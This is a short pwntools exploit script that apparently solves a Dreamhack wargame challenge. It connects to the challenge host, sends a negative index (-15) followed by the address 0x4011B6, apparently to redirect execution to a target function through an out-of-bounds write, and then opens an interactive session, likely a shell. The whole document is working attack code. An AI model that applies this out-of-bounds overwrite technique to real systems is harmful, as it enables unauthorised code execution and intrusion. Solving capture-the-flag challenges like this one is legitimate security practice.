from pwn import *

r = remote("host3.dreamhack.games", 15188)


r.sendlineafter("val: ", str(-15))
r.sendlineafter("val: ", str(0x4011B6))

r.interactive()